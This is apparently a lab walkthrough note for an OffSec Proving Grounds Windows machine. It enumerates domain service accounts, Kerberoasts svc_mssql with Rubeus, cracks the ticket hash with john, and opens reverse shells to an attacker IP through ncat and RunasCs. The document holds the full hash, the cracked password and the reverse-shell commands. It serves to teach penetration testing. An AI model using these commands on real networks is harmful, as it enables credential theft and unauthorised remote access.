`powershell`

`net users`

```
User accounts for \\SERVER

-------------------------------------------------------------------------------
Administrator            Guest                    krbtgt
svc_apache               svc_mssql
```

`net user svc_apache` and `net user svc_mssql` shows they are both domain users.


# PowerView.ps1
We'll use powerview to automate some of our enumeration.

Attacking machine:
`cp $(locate powerview.ps1) .`
`python3 -m http.server 443`

Target machine:
`curl http://<LHOST>:443/powerview.ps1 -O`

`Import-Module .\powerview.ps1`

`Get-NetUser svc_apache`

```
company                       : Access
logoncount                    : 7
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=Apache,CN=Users,DC=access,DC=offsec
objectclass                   : {top, person, organizationalPerson, user}
lastlogontimestamp            : 3/5/2025 11:16:40 AM
samaccountname                : svc_apache
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : NEVER
countrycode                   : 0
whenchanged                   : 3/5/2025 7:16:40 PM
instancetype                  : 4
usncreated                    : 16402
objectguid                    : c279ea6b-9e45-4f00-9df3-38ead363eb47
lastlogoff                    : 12/31/1600 4:00:00 PM
whencreated                   : 4/8/2022 9:30:58 AM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
dscorepropagationdata         : 1/1/1601 12:00:00 AM
givenname                     : Apache
usnchanged                    : 94228
lastlogon                     : 3/5/2025 11:16:40 AM
badpwdcount                   : 0
cn                            : Apache
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
objectsid                     : S-1-5-21-537427935-490066102-1511301751-1103
primarygroupid                : 513
pwdlastset                    : 4/8/2022 2:30:58 AM
msds-supportedencryptiontypes : 0
name                          : Apache
```

`Get-NetUser svc_mssql`

```
company                       : Access
logoncount                    : 1
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=MSSQL,CN=Users,DC=access,DC=offsec
objectclass                   : {top, person, organizationalPerson, user}
lastlogontimestamp            : 4/8/2022 2:40:02 AM
usncreated                    : 16414
samaccountname                : svc_mssql
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : NEVER
countrycode                   : 0
whenchanged                   : 7/6/2022 5:23:18 PM
instancetype                  : 4
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
objectguid                    : 05153e48-7b4b-4182-a6fe-22b6ff95c1a9
lastlogoff                    : 12/31/1600 4:00:00 PM
whencreated                   : 4/8/2022 9:39:43 AM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
dscorepropagationdata         : 1/1/1601 12:00:00 AM
serviceprincipalname          : MSSQLSvc/DC.access.offsec
givenname                     : MSSQL
usnchanged                    : 73754
lastlogon                     : 4/8/2022 2:40:02 AM
badpwdcount                   : 0
cn                            : MSSQL
msds-supportedencryptiontypes : 0
objectsid                     : S-1-5-21-537427935-490066102-1511301751-1104
primarygroupid                : 513
pwdlastset                    : 5/21/2022 5:33:45 AM
name                          : MSSQL
```

This svc_mssql account stands out because it has a `ServicePrincipalName`, MSSQLSvc/DC.access.offsec.

This means it is a Kerberos service, so we'll want to attempt Kerberoasting.

To perform a kerberoasting attack, we need the TGS (KDC component that issues a service ticket).

We'll transfer Rubeus to the target and execute it.

Attacking machine:
`cp /usr/share/windows-resources/rubeus/Rubeus.exe .`
`python3 -m http.server 443`

Target machine:
`curl http://<LHOST>:443/Rubeus.exe -O`

`.\Rubeus.exe kerberoast /nowrap`

```
[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 1


[*] SamAccountName         : svc_mssql
[*] DistinguishedName      : CN=MSSQL,CN=Users,DC=access,DC=offsec
[*] ServicePrincipalName   : MSSQLSvc/DC.access.offsec
[*] PwdLastSet             : 5/21/2022 12:33:45 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$EBE25705596E41A5045A2709E53A5505$F7B77C5A79CB9CCCA30B20C0CDE1B01BF994A0D50DB8456FA11A15AE6BE8A60A9FAD1A8ADB195B2EAF3EC34A2028A784EDF70461BD52E1C368E227E5EEFF2EC8F69B75A969897102A3A9CB40AFE944209AA432FC772230E719AA5A7CEA1B412E9F9F1D647F8DF9E4C859C5193239DBA644BB478A3322E272A935D70A3CFE2DBF16269D9D3267F315238A203CDDA0295A983395D1C9E37533DAFE978CB050D1A7BB20423094713D6D29F5EDA65FB46ACE8E49705216A8F88FD4E9EDB2B09E41AA13E99C22EF26264D8C845B095C159E7508A08D8EADD161B4B4956A77924506D86AD565B4DB8A1927D0D8CFF367BD330B0AC8C41EEFA08E099DB56364368661DE1465B83850EF1D91AB4EEDF1FB6EC098076876DEDF67F2CBD7F535D1FBEFCDF33258D245EC840D7F9FCCEE510A79C5F11725704CE3FDEF7634067A10A5A381A2556E48B6D5E9BA42C719E1996AB8952680547AA7C4A55973DD0C9625ACD25C17CDB66FEA4A7F7B2E22438EB8B99A9E608A6FE11169CC89036227A2AB9D098902C6AF7C40FE41B58BA10BDE1A4F3C739E30F81C27FA069EF09F8EF375E47C8FDCE3B20022D1A7DA2286F1693BB6F77549EA298EDD71D92C096E9F76CC462F6247D1F154B3376E85D429D54E5E40DFC847A38CEA1C9C8C4F336D1F2E04C26048B6CDD22EECB1B5B3CB641679F6DC7398F51D1F5134A407DF965947F31517A6595C0ACAC25FB39FCED1A480832F989071C808DDC180B0429400990C337A28CA78A30174337AA298E939CA74CE4F882B93A763026EC87629372B72F6A905D7312C992989256EC338EF49C7EE7BC7B94C67CBC45D3C589FFEBE53FC182B3E72B57B1210A8B56ADEC3E4080D7BC6EB413524D96D89D2606AD3BE1FE7A448AC079D9E14467B6968BE16B56A9126F52C8C7A6FFCE29D429CDEBDF51A2D32D350FF75A63AC1E68267FD2C1253D9C54583659ECC3A8329D67616D02AD468E9EE505E744572A48590DCC661E3BC13F94CBDF7DFC8091577AB23A2BD15A2D2E0BC2F059991861885250FDA8D9197E3FDEAA7A5D49459A1EAB731F81644EBE59F271A833FF7D1E0D58548FFECE21B64CADBA7A994B9297207DD87BAE74C7385636F88162A7A1668578E36162748478CE06CE1C3C97E35FFD6B9D08C0205EEE348FD0130FB3AC917D3561B5192AB0C207985CEB9FEB00E5B65BADA4AAED249154988F2581F11E145D18D06264EAB4970FD4A62F27960096C26DFACAD189ECB3892BF93860033A63798171858C824CCE5013F4C91DC8681FBFB94648B1DFE6B67E0FD5BB041DF2A697DF2153D8887A4D3A12C0E079CF54F8C580F450CD86B24F07B60F89DDFE07757D0B1579AB5ED018BDADB5DDED6C2DEC7A91D758332F1B68AC4B9F62A2FB9FABA99B481CB4FF617781466B2DFB3DF4D63D4BE17262479F1BCECCA9341F868FD4D7D0CBF35B76B4BD9B97B597584575F29C0D9BCE65A70DA6D165A3ABA6A9FBF7AB3E34364A8995FA0013B5B70480F69906AD8BC798919C7A5DD168E2BD04C0DE7F2C5399349D070F0C3A1F94148989E86646150F3ACC1476C65081138072D2EDA1C479E29E5C4A16E765F11A4EBCACC13CC
```

(Added to [[Archive/OFFSEC - Proving Grounds Writeups/Windows/Access/Findings|Findings]])

Crack using john to get plaintext password for svc_mssql:
`john hash --wordlist=/usr/share/wordlists/rockyou.txt`

`trustno1`
(Added to [[Archive/OFFSEC - Proving Grounds Writeups/Windows/Access/Findings|Findings]])

# Remoting as svc_mssql
Are these credentials valid? Can we use them to remote in?
`netexec smb 192.168.179.187 -u svc_mssql -p 'trustno1'`

Authentication was successful, so the credentials are valid, but no access. This is the same outcome for winrm, wmi and rdp.
```
SMB         192.168.179.187 445    SERVER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVER) (domain:access.offsec) (signing:T
rue) (SMBv1:False)
SMB         192.168.179.187 445    SERVER           [+] access.offsec\svc_mssql:trustno1
```

It turns out the account would need to be in the "Remote Management Users" or "Administrators" local group for it to be authorized for remote sign in.
We can verify by running the following as svc_apache:
`net localgroup "Remote Management Users"`
`net localgroup "Administrators"`

# RunasCs -> Reverse Shell
Instead of remoting in, let's try authenticating locally to get a reverse shell.

## Invoke-RunasCs.ps1 (unsuccessful)
Transfer Invoke-RunasCs.ps1 to the target:
https://github.com/antonioCoco/RunasCs/tree/master

Start new nc listener on attacking machine:
`nc -lnvp 8080`

Connect to our listener as svc_mssql:
`Import-Module .\InvokeRunasCs.ps1`
`powershell.exe -ExecutionPolicy Bypass .\Invoke-RunasCs -Username 'svc_mssql' -Password 'trustno1' -Command 'whoami'`
`.\Invoke-RunasCs svc_mssql trustno1 'c:\xampp\htdocs\uploads\ncat.exe 192.168.45.155 8080 -e cmd.exe'`

`Start-Process powershell -Credential $cred -ArgumentList '-NoExit', '-Command', 'whoami'`

`$username = "access.offsec\svc_apache"`
`$password = ConvertTo-SecureString "trustno1" -AsPlainText -Force`

```
$username = "access.offsec\\svc_mssql"
$password = ConvertTo-SecureString "trustno1" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)

Start-Process "cmd.exe" -Credential $cred

Start-Process -FilePath "C:\xampp\htdocs\uploads\ncat.exe" -ArgumentList "192.168.45.155 8080 -e cmd.exe" -Credential $cred
```

## RunasCs.exe (Reverse Shell)
Since that didn't allow me to run anything at all, I'll try the executable version of RunasCs.
Transferring over HTTP failed on various ports, likely due to Windows Firewall blocking me at this point, but I was finally able to still transfer via ncat:

On Windows:
`.\ncat.exe -lnvp 8000 > RunasCs.exe`
Kali:
`ncat 192.168.179.187 8000 < RunasCs.exe`

To verify that the transfer was successful, I compared the outputof `Get-FileHash -Algorithm 'sha256' RunasCs.exe` on Windows and `sha256sum RunasCs.exe` on Linux. In my case, this transfer was still not working after retrying.

At this point, I reset the machine to a fresh state to try again. I was able to transfer RunAs.exe to the target using HTTP this time, and now it actually allowed me to run commands as svc_mssql, using the [usage page on GitHub](https://github.com/antonioCoco/RunasCs?tab=readme-ov-file#usage) as reference:
To test:
`.\RunasCs.exe svc_mssql trustno1 "cmd /c whoami /all"`

To establish a reverse shell as svc_mssql:
`nc -lnvp 8081`
`.\RunasCs.exe svc_mssql trustno1 cmd.exe -r 192.168.45.155:8081`

![[Pasted image 20250802083635.png]]

The first flag is in `C:\Users\svc_mssql\Desktop\local.txt`
![[Pasted image 20250802083823.png]]

Continue in [[svc_mssql -> System]]